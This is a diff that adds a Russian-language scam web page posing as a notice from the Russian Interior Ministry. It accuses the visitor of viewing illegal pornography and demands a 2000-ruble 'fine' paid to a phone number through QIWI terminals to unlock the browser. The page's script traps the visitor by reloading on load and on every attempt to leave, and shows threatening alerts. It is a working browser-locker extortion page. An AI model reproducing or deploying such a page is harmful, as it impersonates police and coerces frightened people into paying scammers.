@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+
+        <title>Нарушен закон (ст. 14.5 КоАП). Ваш компьютер заблокирован!</title>
+
+        <meta charset="utf-8">
+
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link href="css00000.css" rel="stylesheet" type="text/css">
+        <link rel="stylesheet" href="bootstra.css">
+        <link rel="stylesheet" href="bootstrb.css">
+        <link rel="stylesheet" href="font-awe.css">
+        <link rel="stylesheet" href="styles00.css">
+        <link rel="shortcut icon" href="favicon0.htm">
+
+        <script>
+
+            var phone="+7 (909) 657-65-49";
+
+
+            //============================================
+
+            Date.prototype.toLocaleFormat = function(format) {
+	            var f = {y : this.getYear() + 1900,m : this.getMonth() + 1,d : this.getDate(),H : this.getHours(),M : this.getMinutes(),S : this.getSeconds()}
+	            for(k in f)
+		            format = format.replace('%' + k, f[k] < 10 ? "0" + f[k] : f[k]);
+	            return format;
+            };
+
+            var today = new Date().toLocaleFormat('%d.%m.%y');
+
+            function getRandom(min, max) {
+                return Math.random() * (max - min) + min;
+            }
+
+            var number_p = getRandom(600000000, 699999999);
+
+            //============================================
+
+            var color="red";
+
+            function blik(){
+              document.getElementById("warning").style.color=color;
+              if(color=="red")color="black";
+              else color="red";
+            }
+
+            setInterval("blik()",200);
+
+            //============================================
+
+
+
+            onbeforeunload=function(){
+                location.reload();
+                alert("Внимание! Вы нарушили закон (ст. 14.5 КоАП)\n\nВаш компьютер заблокирован за нарушение закона РФ\nпри просмотре запрещенной порнографии!\n\nВнимательно ознакомьтесь с содержанием страницы,\nв противном случае Вам грозит уголовная ответственность!");
+                return "Внимание! Вы нарушили закон (ст. 14.5 КоАП)\n\nВаш компьютер заблокирован за нарушение закона РФ\nпри просмотре запрещенной порнографии!\n\nВнимательно ознакомьтесь с содержанием страницы,\nв противном случае Вам грозит уголовная ответственность!";
+            };
+
+            onload=function(){
+                location.reload();
+            }
+
+
+        </script>
+
+
+
+    </head>
+    <body>
+
+        <div class="container">
+            <div class="page-header clearfix">
+                <div class="pull-right">
+                    <h4>Ваш IP: 129.151.76.102 <br>Определяется местоположение: <i class="fa fa-spinner fa-spin"></i></h4>
+                    <!--
+                    <small>*Если Ваш регион не установлен по ИП адресу,<br/>для определение вашего местоположения будет<br/> использоваться внутренняя база данных провайдеров.</small>
+                    -->
+                </div>
+                <img src="logo0000.png" class="pull-left" style="height: 60px; margin-right: 20px;">
+                <h4 style="margin-top: 0px">
+                    <font color="#000">
+                        МИНИСТЕРСТВО ВНУТРЕННИХ ДЕЛ<br>
+                        РОССИЙСКОЙ ФЕДЕРАЦИИ<br>
+                        <font style="color: red">Вами был нарушен Закон!</font>
+                    </font>
+                </h4>
+                
+            </div>
+
+
+            <div class="row">
+
+                <div class="col-lg-8">
+
+                    <small>
+                <h4>Постановление 87 АК № 606956103.6248614 от <script>document.writeln(today);</script>(1)</h4>
+                <br>
+                <font style="color: red;">МВД РФ было обнаружено использование вашего электронного устройства с противоправной целью, а именно - просмотр и копирование материалов, содержащих элементы педофилии, насилия и ГЕЙ-ПОРНО.</font>
+                <br><br>
+                Данные действия содержат в себе состав административного правонарушения предусмотренного ст. 14.5 КоАП и влекут за собой наложение административного взыскания в размере от 1000 до 400 000 рублей
+
+                <br><br>
+                В случае уклонения от уплаты штрафа предусмотрена уголовная ответственность по ст. 242 УК РФ, в порядке, предусмотренном ст. 31 УПК РФ.
+
+                <br><br>
+                <font style="color: red;">Постановлением по делу об административном правонарушении серия 87 АК № 606956103.6248614 от <script>document.writeln(today);</script>(1) на Вас наложен административный штраф в размере <b>2000 рублей</b>. Оплату штрафа Вы можете произвести в любом терминале оплаты мобильной связи путем перечисления суммы взыскания на номер счета <b>Билайн <script>document.write(phone);</script></b></font>
+
+                <br><br>
+                После оплаты штрафа на выданном чеке Вы найдёте код разблокировки, который необходимо ввести в поле для разблокировки браузера. В случае отказа от уплаты штрафа(2) - на основании ч.2 ст. 41 КАС РФ и ст.31 УПК РФ - материалы дела будут переданы в прокуратуру для принятия решения относительно возбуждения уголовного дела по факту совершения преступления предусмотренного ст. 242 УК РФ, будет отправлен запрос вашему провайдеру для уточнения владельца данного устройства и после выслано письмо с повесткой для разбирательств по данному нарушению.
+
+                <br><br>
+                (1) Постановление сгенерировано автоматически роботом МВД по отслеживанию нарушений, связанных с просмотром и копированием материалов содержащих элементы педофилии, насилия и ГЕЙ-ПОРНО<br>
+                (2) <b>На оплату штрафа Вам отведено 12 часов.</b>
+            </small>
+
+                </div>
+
+                <div class="col-lg-4">
+                    <div class="clearfix">
+
+                        <h4 id="warning">На оплату штрафа Вам отведено 12 часов.</h4>
+
+                        <hr>
+
+                        <h4 style="margin-bottom: 40px;">Оплата при помощи QIWI терминалов</h4>
+                        <img src="qiwi_log.png" style="float:right">
+                        <p>
+                            <small>1. В терминале QIWI выберите "Оплата мобильной связи оператора Билайн".<br><br>
+                            2. Наберите номер счета <b style="font-size: 16px;"><script>document.write(phone);</script></b><br><br>
+                            3. Внесите денежные купюры в приемник и нажмите Оплатить.<br><br>
+                            После оплаты будет выдан чек с кодом разблокировки браузера.<br><br>
+                            Сумма к оплате: <b style="font-size: 16px;">2000 руб.</b><br>
+                            * Терминал может взимать комиссию при оплате штрафа.</small>
+                        </p>
+                    </div>
+
+                    <hr>
+
+                    <p>
+                        <form class="form-inline" role="form">
+                            <div class="form-group">
+                                <label class="sr-only" for="code">Код для разблокировки</label>
+                                <input type="email" class="form-control input-sm" id="exampleInputEmail2" placeholder="Введите код">
+                            </div>
+                            <div class="form-group">
+                            <button type="submit" class="btn btn-primary btn-">Разблокировать</button></div>
+                        </form>
+                    </p>
+
+                </div>
+
+            </div>
+
+        </div>
+
+<script type="text/javascript"><!--
+document.write("<a href='//www.liveinternet.ru/click;a1s2' "+
+"target=_blank><img src='//counter.yadro.ru/hit;a1s2?t44.6;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random()+
+"' alt='' title='LiveInternet' "+
+"border='0' width='1' height='1'><\/a>")
+//--></script>
+
+
+
+    </body>
+</html>
